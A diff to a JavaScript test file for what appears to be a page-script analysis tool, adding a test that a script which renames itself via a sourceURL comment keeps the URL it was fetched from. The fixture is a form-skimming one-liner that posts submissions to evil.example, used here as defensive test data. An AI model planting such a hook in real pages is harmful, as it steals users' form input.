@@ -22,6 +22,7 @@ async function build({ parsed, requests = [], docUrls = [PAGE] }) {
   const scriptLog = { parsed: parsed.map((p, i) => ({ sessionId: 's', v8Hash: `h${i}`, length: p.source.length, stack: null, frameId: 'f', wasm: false, module: false, sourceURL: false, ...p })) };
   const netLog = {
     scriptRequest: (url) => requests.find((r) => r.url === url && r.type === 'Script') ?? null,
+    scriptRequests: () => requests.filter((r) => r.type === 'Script'),
     documentUrls: () => new Set(requests.filter((r) => r.type === 'Document').map((r) => r.url)),
   };
   const cache = { sources: new Map(), bodies: new Map(), analysis: new Map() };
@@ -65,4 +66,14 @@ test('an inline script is still inline after the page changed its address with h
     docUrls: [`${PAGE}?step=2`],
   });
   assert.equal(s.kind, 'inline');
+});
+
+test('a fetched file that gives itself another name keeps the address it was fetched from', async () => {
+  const source = 'document.forms[0].onsubmit = () => fetch("https://evil.example/c");\n//# sourceURL=x';
+  const [s] = await build({
+    parsed: [{ scriptId: '1', url: 'x', sourceURL: true, source }],
+    requests: [{ requestId: 'r1', url: 'https://evil.example/skim.js', type: 'Script', body: source }],
+  });
+  assert.equal(s.kind, 'external');
+  assert.equal(s.ref.url, 'https://evil.example/skim.js');
 });
